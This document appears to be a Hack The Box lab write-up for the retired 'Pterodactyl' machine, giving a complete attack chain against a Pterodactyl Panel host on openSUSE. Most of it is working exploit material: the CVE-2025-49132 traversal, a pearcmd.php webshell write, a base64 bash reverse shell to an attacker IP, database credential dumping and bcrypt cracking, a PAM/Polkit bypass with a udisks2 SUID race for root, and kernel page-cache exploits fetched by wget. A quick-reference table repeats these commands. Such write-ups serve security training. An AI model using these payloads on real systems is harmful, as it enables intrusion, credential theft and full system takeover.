
> **Difficulty:** Medium | **OS:** Linux (openSUSE Leap 15.6) | **Released:** 07 Feb 2026 | **Retired:** 16 May 2026 **Creators:** HeadMonitor, TheCyberGeek

## HTB Pterodactyl Summary

Pterodactyl runs a Minecraft community website alongside an instance of the Pterodactyl game-server management panel (v1.11.10) on openSUSE Leap 15.6. The full attack chain is:

1. Subdomain brute-force finds `panel.pterodactyl.htb` running Pterodactyl Panel v1.11.10 — a Laravel PHP application
2. `phpinfo.php` and `changelog.txt` disclose PHP-FPM, PHP-PEAR, and MariaDB are installed
3. Exploit **CVE-2025-49132** — unauthenticated directory traversal in `/locales/locale.json` causes PHP to `require` arbitrary `.php` files on disk
4. Leak `config/database.php` via the traversal → obtain DB credentials `pterodactyl:PteraPanel`
5. Chain the traversal with **pearcmd.php** (`register_argc_argv` + PEAR's `config-create`) to write a webshell to `/tmp/shell.php`, then trigger it via a second traversal → shell as `wwwrun`
6. Connect to MariaDB with leaked credentials → dump users table → crack `phileasfogg3`'s bcrypt hash → `!QAZ2wsx`
7. Password reused for system login → shell as `phileasfogg3`
8. Exploit **CVE-2025-6018** (PAM environment variable flaw) → plant `.pam_environment` to convince Polkit the SSH session is a physical console session
9. Exploit **CVE-2025-6019** (libblockdev/udisks2) → craft an XFS image containing a SUID-root bash, use `udisksctl` to trigger a resize, race the temporary root-owned mount at `/tmp/blockdev.XXXXX` → copy SUID bash to `/tmp/0xdf` → root
10. Beyond Root: CopyFail (CVE-2026-31431) and DirtyFrag (CVE-2026-43284/43500) both exploited on the host

---

## 01 · Recon

### Nmap

```bash
# Fast full port scan
sudo nmap -p- -vvv --min-rate 10000 10.129.64.117

# Service/version scan
sudo nmap -p 22,80 -sCV 10.129.64.117
```

**Open ports:**

|Port|Service|Version / Notes|
|---|---|---|
|22|SSH|OpenSSH 9.6 (protocol 2.0) — suggests Ubuntu 24.04, but **this is openSUSE**|
|80|HTTP|nginx/1.21.5 — redirects to `pterodactyl.htb`|
|443|HTTPS|**Closed** (stands out from 65512 filtered ports — implies active firewall rule)|
|8080|HTTP-proxy|**Closed** (same pattern)|

Both open ports have TTL of 63, confirming Linux one hop away. The OpenSSH version typically maps to Ubuntu 24.04 noble but the Nginx version is inconsistent with that, suggesting a non-Ubuntu distribution — confirmed later as **openSUSE Leap 15.6**. Nginx is the least reliable indicator for OS version mapping. The two `closed` ports rather than `filtered` indicate a firewall is explicitly blocking/resetting those connections.

### Subdomain Brute Force

```bash
ffuf -u http://10.129.64.117 \
  -H "Host: FUZZ.pterodactyl.htb" \
  -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -ac

# Result: panel [Status: 200, Size: 1897]
```

```bash
# Update /etc/hosts
echo "10.129.64.117 pterodactyl.htb panel.pterodactyl.htb play.pterodactyl.htb" | sudo tee -a /etc/hosts
```

The `play.pterodactyl.htb` hostname is revealed when clicking "Copy Server IP" on the main site — it simply redirects to `pterodactyl.htb` and has no independent attack surface.

---

## 02 · pterodactyl.htb — Enumeration

### Site & Changelog

A Minecraft community landing page. The most valuable finding is `/changelog.txt`, which discloses the entire technology stack in detail:

```
[Installed] Pterodactyl Panel v1.11.10
[Enhanced] PHP Capabilities
  - Enabled PHP-FPM for smoother website handling
  - Enabled PHP-PEAR for PHP package management
  - Added temporary PHP debugging via phpinfo()
[Installed] MariaDB 11.8.3 backend
```

This single file reveals: the panel software and **exact version** (critical for CVE lookup), that PHP-PEAR is installed (essential for the pearcmd.php chain), that phpinfo() is exposed (leaks full PHP config), and the exact MariaDB version.

### Tech Stack

HTTP response headers confirm Nginx + PHP 8.4.8. The `phpinfo.php` page (exposed per changelog) leaks:

- Full PHP configuration including the PEAR include path
- `register_argc_argv = On` — essential for the pearcmd technique
- Document root and include paths

### Directory Brute Force

```bash
feroxbuster -u http://pterodactyl.htb -x php
# Finds: phpinfo.php (828 lines of PHP configuration)
```

---

## 03 · panel.pterodactyl.htb — Enumeration

### Tech Stack Identification

Pterodactyl Panel is an open-source game server management panel built with PHP (Laravel), React, and Go. The response headers immediately reveal the framework:

```
Set-Cookie: XSRF-TOKEN=...    # CSRF token → Laravel pattern
Set-Cookie: pterodactyl_session=...   # Session cookie → Laravel
X-Powered-By: PHP/8.4.8
```

The `XSRF-TOKEN` + `<app>_session` cookie pair is a definitive Laravel fingerprint. The Pterodactyl Panel source repository confirms it is Laravel-based.

### Version Identification

The changelog disclosed `Panel v1.11.10`. Claude AI (noted in the writeup) independently confirmed this by examining JavaScript bundles served to the client — the version string is embedded in the compiled JS.

---

## 04 · CVE-2025-49132 — Unauthenticated Directory Traversal → LFI

### Vulnerability Description

**CVE-2025-49132** — Pterodactyl Panel < 1.11.11:

The `/locales/locale.json` endpoint is exposed **pre-authentication** and passes both the `locale` and `namespace` query parameters directly to Laravel's `FileLoader`, which calls `getRequire()` (PHP's `require`) on the resulting path. Because neither parameter is validated in v1.11.10, an attacker can use `../` sequences in `locale` to traverse outside the expected locale directory and include any `.php` file on the server.

**Root cause (routes/base.php):**

```php
Route::get('/locales/locale.json', Base\LocaleController::class)
    ->withoutMiddleware(['auth', RequireTwoFactorAuthentication::class])
    ->where('namespace', '.*');  // explicitly allows any character
```

**Root cause (LocaleController.php):**

```php
$locale     = $request->input('locale');     // no validation
$namespace  = $request->input('namespace');  // no validation

// Passes to FileLoader::loadPath():
// getRequire("{$path}/{$locale}/{$namespace}.php")
```

**The fix (v1.11.11)** introduced a `LocaleRequest` form request validating:

- `locale`: must match `/^[a-z][a-z]$/` (exactly 2 lowercase letters)
- `namespace`: must match `/^[a-z]{1,191}$/` (1–191 lowercase letters only)

Both restrictions eliminate any traversal characters.

### Exploitation

**Finding the correct traversal depth:**

The Pterodactyl Panel serves from `/var/www/pterodactyl/public/`. The locale files are expected to live inside the resources directory, which is several levels deep. Testing confirms that exactly **two `../`** sequences in `locale` reaches the application's project root:

```bash
# Empty response [] = file doesn't exist at that path
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=public&namespace=index'
# {"public":{"index":[]}}

curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../public&namespace=index'
# {"..\/public":{"index":[]}}

# 500 Server Error = PHP successfully required public/index.php and crashed
# (loading Laravel's front controller twice causes a bootstrap collision)
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../public&namespace=index'
# <!DOCTYPE html> ... 500 Server Error ...
```

The 500 response is the win — PHP executed `getRequire()` on `public/index.php`, which bootstrapped a second Laravel application inside the already-running one and crashed. Two `../` is the correct depth.

**Leaking the database configuration:**

```bash
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../config&namespace=database' -s | jq .
```

This returns the full `config/database.php` as a JSON structure, disclosing:

```
DB username: pterodactyl
DB password: PteraPanel
DB host:     127.0.0.1:3306
DB name:     panel
```

**Limitation:** Only `.php` files can be included (the extension is hardcoded in `loadPath()`). Files like `/etc/passwd` cannot be read this way. PHP filter chains (`php://filter/...`) are also blocked because arbitrary characters cannot be prepended to the path prefix.

---

## 05 · RCE via pearcmd.php

### Background

PEAR (PHP Extension and Application Repository) ships its CLI entry point as a plain PHP file at `/usr/share/php/PEAR/pearcmd.php` (confirmed from phpinfo). This file is ideal as an LFI target because it ends in `.php`. The attack relies on PHP's `register_argc_argv` setting being enabled, which causes PHP to populate the `$argv` array from the URL query string when the QUERY_STRING does not contain `=` in the leading portion.

When PHP parses a query string and `register_argc_argv = On`, `+` characters in the query string become `$argv` separators. The `pearcmd.php` file reads `$argv` to determine its command and arguments. The `config-create` command accepts a content string and a destination path, writing the content to an arbitrary file on disk. Because the content string is embedded in the URL and the destination is also arbitrary, this allows writing any content (including PHP code) to any writable path.

### phpinfo Confirms register_argc_argv is Enabled

The `phpinfo.php` page on the main site confirmed `register_argc_argv = On`. This setting is non-default in modern PHP but is explicitly enabled in the Pterodactyl installation (likely because PEAR's CLI interface requires it).

### PEAR Path Discovery

The phpinfo page also reveals the PEAR include path: `/usr/share/php/PEAR/pearcmd.php`. Five `../` sequences from the locale directory walk up to filesystem root and back down to this path:

```
locale = ../../../../../usr/share/php/PEAR
namespace = pearcmd
```

### Step 1 — Write the Webshell

The webshell payload cannot contain spaces (spaces break URL parsing). The PHP short-echo tag `<?=system($_REQUEST[0]);?>` works without spaces:

```bash
curl -g 'http://panel.pterodactyl.htb/locales/locale.json?\
+config-create+/\
&locale=../../../../../usr/share/php/PEAR\
&namespace=pearcmd\
&/<?=system($_REQUEST[0]);?>\
+/tmp/shell.php'
```

The `argv` array when PHP processes this URL:

|Index|Value|
|---|---|
|`$argv[0]`|`` (empty — before first `+`)|
|`$argv[1]`|`config-create`|
|`$argv[2]`|`/&locale=.../<?=system($_REQUEST[0]);?>` (content to write)|
|`$argv[3]`|`/tmp/shell.php` (destination path)|

PEAR writes a config file to `/tmp/shell.php` that contains the webshell embedded in the PEAR configuration XML. The response ends with:

```
Successfully created default configuration file "/tmp/shell.php"
500 Server Error   ← pearcmd.php also crashes Laravel's second bootstrap
```

### Step 2 — Execute Commands via the Webshell

```bash
# Verify execution
curl -sg 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell&0=id'
# Output includes: uid=474(wwwrun) gid=477(www) groups=477(www)
```

The `locale=../../../../../tmp` and `namespace=shell` parameters cause PHP to require `/tmp/shell.php` (the file written in step 1). The `0=id` parameter becomes `$_REQUEST[0]` in the webshell, which is passed to `system()`.

---

## 06 · Shell as wwwrun

### Get a Reverse Shell

Pad the base64-encoded payload with spaces until no special characters appear in the output (avoids shell escaping issues):

```bash
echo 'bash -i  >& /dev/tcp/10.10.14.61/443  0>&1  ' | base64
# YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxICAK

# Start listener
rlwrap -cAr nc -lnvp 443

# Trigger the webshell
curl -sg 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell' \
  -G --data-urlencode '0=echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxICAK | base64 -d | bash'
```

### Upgrade Shell

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset
# Terminal type? screen
```

---

## 07 · Post-Exploitation — wwwrun Enumeration

### OS Identification

```bash
cat /etc/os-release
# NAME="openSUSE Leap"
# VERSION="15.6"
```

This explains the version discrepancies during nmap enumeration — openSUSE packages different software versions than Ubuntu/Debian. The box is potentially vulnerable to CopyFail and DirtyFrag (two recent Linux page-cache LPEs, explored in Beyond Root).

### Users

```bash
cat /etc/passwd | grep 'sh$'
# root, nobody (common on openSUSE), headmonitor (uid 1001), phileasfogg3 (uid 1002)

ls /home
# headmonitor  phileasfogg3

# phileasfogg3's home is world-readable
ls -la /home/phileasfogg3
# user.txt is world-readable
cat /home/phileasfogg3/user.txt   # grab user flag directly as wwwrun
```

### Database Access

```bash
mariadb -u pterodactyl -pPteraPanel -h 127.0.0.1 panel
```

```sql
-- Dump user credentials
SELECT username, password FROM users;
```

**Output:**

|Username|Bcrypt Hash|
|---|---|
|`headmonitor`|`$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2`|
|`phileasfogg3`|`$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi`|

Both are bcrypt `$2y$` hashes with cost factor 10.

### Crack Hashes

```bash
hashcat -m 3200 hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
# $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi:!QAZ2wsx
```

`phileasfogg3`'s hash cracks in approximately a minute. `headmonitor`'s hash does not crack from rockyou.txt.

---

## 08 · Shell as phileasfogg3

```bash
# From wwwrun shell
su - phileasfogg3
# Password: !QAZ2wsx

# Or SSH directly
sshpass -p '!QAZ2wsx' ssh phileasfogg3@pterodactyl.htb
```

Password reuse between the Pterodactyl Panel application account and the system OS account is the pivot.

---

## 09 · Privilege Escalation — Enumeration

### sudo -l (openSUSE Default Configuration)

```bash
phileasfogg3@pterodactyl:~> sudo -l
# Matching Defaults entries:
#   always_set_home, env_reset, targetpw, ...
# User phileasfogg3 may run the following commands:
#   (ALL) ALL
```

The `targetpw` directive changes sudo's password prompt behaviour: instead of requiring the **current user's** password, it requires the **target user's** password. With `targetpw`, `sudo su -` prompts for root's password rather than `phileasfogg3`'s. This is the default openSUSE sudo configuration. Combined with `(ALL) ALL`, it looks like full sudo access but is effectively nothing without root's password.

### Mail Hint — udisks2

`/var/spool/mail/phileasfogg3` contains an internal email from `headmonitor` (the system administrator) warning about unusual `udisksd` activity and advising users not to connect untrusted external media. This is the hint to look at the udisks2 attack surface. `udisksd` is the userspace daemon in `udisks2` that manages storage devices on Linux — it runs as root and exposes its management interface over D-Bus, meaning vulnerabilities in its media-parsing or D-Bus handlers translate directly to root code execution.

---

## 10 · CVE-2025-6018 — PAM Environment Variable / Polkit Bypass

### Vulnerability Description

**CVE-2025-6018** — Local Privilege Escalation in pam-config:

Polkit uses environment variables `XDG_SEAT` and `XDG_VTNR` to determine whether a session is "active" (physically present at a local console). Actions requiring `allow_active = yes` in Polkit policy (such as `org.freedesktop.udisks2.loop-setup`) are normally restricted to local console sessions. SSH sessions are "active" but not "local console", so they are denied these actions by default.

The vulnerability is in how PAM loads user environment variables. When a user has a `.pam_environment` file in their home directory, PAM reads it during login and sets those variables for the session. Because `XDG_SEAT` and `XDG_VTNR` are populated from this file **before** Polkit consults them, a user can set these to console-identifying values and convince Polkit that their remote SSH session is a local console session, unlocking `allow_active` Polkit actions.

### Exploitation

```bash
# Create the PAM environment file
echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment

# Exit SSH and reconnect (PAM reads the file at session start)
# Verify the variables are set in the new session
env | grep XDG
# XDG_SEAT=seat0
# XDG_VTNR=1

# Confirm Polkit now grants loop-setup permission
pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$ && echo POLKIT_OK
# POLKIT_OK
```

Without this fix, `udisksctl loop-setup` would fail with a Polkit authorization error for an SSH session.

---

## 11 · CVE-2025-6019 — libblockdev/udisks2 SUID-Root Escalation

### Vulnerability Description

**CVE-2025-6019** — Local Privilege Escalation in libblockdev:

When `udisks2` mounts user-provided filesystem images, it applies security flags `nosuid,nodev` to prevent privilege escalation via SUID binaries. However, when `libblockdev` runs a filesystem resize operation, it mounts the filesystem internally at `/tmp/blockdev.XXXXXX` to execute resize tooling — and this internal mount does **not** carry udisks2's security flags. If a user triggers a resize operation on a filesystem image containing a SUID-root binary, there is a window during which the SUID binary is accessible from the temporary mount path with full SUID semantics, allowing execution as root.

### Step 1 — Obtain Target's bash Binary

Because the target runs openSUSE and the attacker runs a different distribution, the `bash` binary must be copied from the target to ensure glibc compatibility:

```bash
sshpass -p '!QAZ2wsx' scp phileasfogg3@pterodactyl.htb:/usr/bin/bash .
```

### Step 2 — Create the Malicious XFS Image (on Attacker Machine)

The image must be at least 512 MB for the XFS filesystem to fit:

```bash
# Create empty image file
sudo dd if=/dev/zero of=payload.img bs=1M count=512

# Format as XFS (crc=0 for kernel compatibility)
sudo mkfs.xfs -m crc=0 -f payload.img

# Mount, add SUID-root bash, unmount
sudo mkdir /mnt/xfs
sudo mount -o loop payload.img /mnt/xfs/
sudo cp bash /mnt/xfs/rootbash
sudo chown root:root /mnt/xfs/rootbash
sudo chmod 6755 /mnt/xfs/rootbash   # SetUID + SetGID
ls -l /mnt/xfs/rootbash
# -rwsr-sr-x 1 root root 1012656 ... rootbash

sudo umount /mnt/xfs
```

### Step 3 — Upload the Image

```bash
sshpass -p '!QAZ2wsx' scp payload.img phileasfogg3@pterodactyl.htb:/tmp/payload.img
```

### Step 4 — Set Up the Loop Device (Requires CVE-2025-6018 Already Applied)

```bash
# On the target, after reconnecting SSH with .pam_environment set
udisksctl loop-setup -f /tmp/payload.img
# Mapped file /tmp/payload.img as /dev/loop0.
```

Without the PAM/Polkit bypass from CVE-2025-6018, this command would fail with a Polkit authorization error.

### Step 5 — Identify the Temporary Mount Path Format

Run a watcher loop in one SSH session while triggering a resize from another to discover the format of the temporary mount directory:

```bash
# Terminal 1 — watcher
while true; do
  find /tmp /run /var/tmp -maxdepth 3 -type d \
    \( -name '*resize*' -o -name '*blockdev*' -o -name 'temp-*' \) \
    2>/dev/null
done | awk '!seen[$0]++'

# Terminal 2 — trigger resize
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

The watcher output reveals: `/tmp/blockdev.VY5KP` — the pattern is `/tmp/blockdev.XXXXX`.

### Step 6 — Race the Temporary Mount Window

Run a tight polling loop that watches for the temporary mount directory to appear and immediately executes the SUID binary inside it to create a persistent SUID bash at `/tmp/0xdf`:

```bash
# Terminal 1 — race loop
while true; do
  for d in /tmp/blockdev.*; do
    if [ -x "$d/rootbash" ] && "$d/rootbash" -p -c \
      'cp /bin/bash /tmp/0xdf; chown root:root /tmp/0xdf; chmod 4755 /tmp/0xdf; echo PWNED' \
      2>/dev/null
    then
      break 2
    fi
  done
done

# Terminal 2 — trigger resize again (same gdbus command)
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

```
PWNED
```

The race loop wins the window: during the brief period when libblockdev mounts the image without `nosuid`, `rootbash` (SUID-root) executes and creates `/tmp/0xdf` as a SUID-root copy of bash.

### Step 7 — Root Shell

```bash
/tmp/0xdf -p
# 0xdf-4.4# whoami
# root
# 0xdf-4.4# cat /root/root.txt
```

---

## 12 · Beyond Root — CopyFail and DirtyFrag

### CopyFail (CVE-2026-31431)

CopyFail is described as: _"One logic bug in `authencesn`, chained through `AF_ALG` and `splice()` into a 4-byte page-cache write — silently exploitable for nearly a decade."_ It exploits Linux's `AF_ALG` (kernel crypto interface) socket combined with `splice()` to achieve an arbitrary 4-byte write into the kernel's page cache — the in-memory copy of files that the kernel returns to readers — without modifying the underlying on-disk file. By overwriting a sensitive executable's page-cache entry, the exploit achieves code execution as root without leaving permanent disk modifications.

**Problem on Pterodactyl:** The published Python PoC uses `os.splice()`, which was added in Python 3.10. The target runs Python 3.6:

```
AttributeError: module 'os' has no attribute 'splice'
```

**Fix:** Replace the two `splice()` calls (file → pipe → socket) with a single `os.sendfile()` call. Under modern Linux kernels, `sendfile()` uses the same internal splice machinery — it copies page-cache references rather than byte-copying data:

```python
# Original (Python 3.10+ only):
pipe_r, pipe_w = os.pipe()
os.splice(file_fd, pipe_w, splice_len, offset_src=0)
os.splice(pipe_r, op_sock.fileno(), splice_len)
os.close(pipe_r)
os.close(pipe_w)
op_sock.close()

# Fixed (Python 3.6+):
os.sendfile(op_sock.fileno(), file_fd, 0, splice_len)
try:
    op_sock.recv(8 + offset)
except OSError:
    pass
op_sock.close()
```

With this fix, CopyFail runs successfully:

```bash
python3 copyfail.py
# pterodactyl:/home/phileasfogg3 #
```

**Cleanup:** Because CopyFail modifies the page cache without touching disk, `echo 3 > /proc/sys/vm/drop_caches` flushes the cache and restores the original file contents, avoiding any permanent system modification.

### DirtyFrag (CVE-2026-43284 / CVE-2026-43500)

DirtyFrag is a vulnerability class that chains two page-cache write primitives:

- **CVE-2026-43284** — `xfrm-ESP Page-Cache Write` (requires unprivileged user namespaces)
- **CVE-2026-43500** — `RxRPC Page-Cache Write` (alternative path)

Both achieve an arbitrary write into the kernel's page cache, which is then used to patch a SUID binary's in-memory representation.

**On Pterodactyl:** The ESP path works out-of-the-box because openSUSE Leap 15.6 ships with unprivileged user namespaces enabled by default (unlike Ubuntu 23.10+ which restricts them via AppArmor):

```bash
# Download pre-compiled binary (compiled on attacker's Ubuntu system)
wget 10.10.14.61/exp
chmod +x exp

./exp -v
# [su] installed 48 xfrm SAs
# [su] wrote 192 bytes to /usr/bin/su starting at 0x0
# [su] /usr/bin/su page-cache patched (entry 0x78 = shellcode)
# pterodactyl:/home/phileasfogg3 #
```

The RxRPC path (forced via `--force-rxrpc` or by disabling user namespaces) crashes on this target. The exploit hardcodes internal kernel struct offsets derived from upstream kernels; the openSUSE kernel applies distribution-specific patches that shift those offsets, causing a segmentation fault in stage 2a.

---

## Key Concepts & Analyst Notes

### CVE-2025-49132 — Laravel FileLoader LFI Pattern

The vulnerability pattern: a pre-auth endpoint passes unsanitised user input into `Laravel\Translation\FileLoader::loadPath()`, which calls `getRequire()` (PHP `require`) on the concatenated path. The traversal depth must be determined empirically:

```bash
# Test traversal depth — empty [] = file not found; 500 = file found and executed
curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../config&namespace=database'

# Read any .php file in the project:
# locale = ../../<relative_path_from_project_root>
# namespace = <filename_without_extension>

# Example: read config/database.php
# locale = ../../config
# namespace = database

# Example: include pearcmd.php at /usr/share/php/PEAR/
# locale = ../../../../../usr/share/php/PEAR
# namespace = pearcmd
```

**Limitation:** Only `.php` files can be included. The extension is hardcoded in `loadPath()`. PHP filter chains cannot be used because the path prefix is prepended by the framework.

---

### pearcmd.php LFI-to-RCE Chain

This technique is applicable whenever PHP has `register_argc_argv = On` and PEAR is installed. The `pearcmd.php` file processes `$argv` populated from the URL query string, and its `config-create` command writes arbitrary content to an arbitrary file path:

```bash
# Template
curl -g 'http://target/lfi_endpoint?+config-create+/<CONTENT_PLACEHOLDER>+<WRITE_PATH>&<LFI_PARAM_1>=<PATH_TO_PEAR>&<LFI_PARAM_2>=pearcmd'

# For Pterodactyl CVE-2025-49132:
curl -g 'http://panel.pterodactyl.htb/locales/locale.json?\
+config-create+/\
&locale=../../../../../usr/share/php/PEAR\
&namespace=pearcmd\
&/<?=system($_REQUEST[0]);?>\
+/tmp/shell.php'

# Execute commands via the webshell:
curl -sg 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell&0=id'
```

**Key constraints:**

- The payload content cannot contain spaces (spaces become `$argv` delimiters when `register_argc_argv = On`)
- Use `$_REQUEST[0]` with numeric keys to avoid spaces in the webshell
- Use `<?=system(...);?>` (short-echo tag) instead of `<?php echo system(...); ?>` to avoid spaces
- The PEAR path varies by distribution — always confirm from phpinfo

---

### openSUSE sudo `targetpw` — Not What It Looks Like

On openSUSE, the default `/etc/sudoers` includes `targetpw`, which means `sudo` asks for the **target user's** password rather than the calling user's password. `(ALL) ALL` with `targetpw` effectively means "can run anything if you know root's password" — which is no more useful than `su -` directly. Do not be misled by what appears to be full sudo access.

---

### CVE-2025-6018 / CVE-2025-6019 — Two-CVE Chain for udisks2 Root

The chain requires both CVEs:

|CVE|Mechanism|Effect|
|---|---|---|
|CVE-2025-6018|`.pam_environment` sets `XDG_SEAT=seat0 XDG_VTNR=1` → Polkit sees a "local console" session|Unlocks `allow_active` Polkit actions from SSH|
|CVE-2025-6019|libblockdev's internal resize mount at `/tmp/blockdev.XXXXX` lacks `nosuid,nodev`|SUID binary in the XFS image executes as root during resize window|

**Pre-requisites for CVE-2025-6019:**

- Image must be large enough for XFS (≥ 512 MB for a minimal filesystem)
- Image must be formatted with `mkfs.xfs -m crc=0` for compatibility
- The bash binary must match the target's glibc (copy from target, not compile fresh)
- CVE-2025-6018 must be applied first (SSH sessions cannot call `loop-setup` without the Polkit bypass)

---

### Quick Reference — Key Commands

|Task|Command|
|---|---|
|Subdomain fuzz|`ffuf -u http://<IP> -H "Host: FUZZ.<domain>" -w <wordlist> -ac`|
|CVE-2025-49132 file read|`curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../config&namespace=database'`|
|Write webshell via pearcmd|`curl -g 'http://panel...?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>+/tmp/shell.php'`|
|Execute via webshell|`curl -sg '.../locale.json?locale=../../../../../tmp&namespace=shell&0=<CMD>'`|
|Connect to MariaDB|`mariadb -u pterodactyl -pPteraPanel -h 127.0.0.1 panel`|
|Crack bcrypt|`hashcat -m 3200 hashes rockyou.txt`|
|Apply Polkit bypass|`echo -e "XDG_SEAT=seat0\nXDG_VTNR=1" > ~/.pam_environment` (then reconnect SSH)|
|Verify Polkit bypass|`pkcheck --action-id org.freedesktop.udisks2.loop-setup --process $$ && echo POLKIT_OK`|
|Create XFS image|`sudo dd if=/dev/zero of=payload.img bs=1M count=512 && sudo mkfs.xfs -m crc=0 -f payload.img`|
|Add SUID bash to image|`sudo mount -o loop payload.img /mnt/xfs && sudo cp bash /mnt/xfs/rootbash && sudo chmod 6755 /mnt/xfs/rootbash && sudo umount /mnt/xfs`|
|Set up loop device|`udisksctl loop-setup -f /tmp/payload.img`|
|Trigger resize|`gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'`|
|Execute root shell|`/tmp/0xdf -p`|
|Flush page cache (CopyFail cleanup)|`echo 3 > /proc/sys/vm/drop_caches`|

---
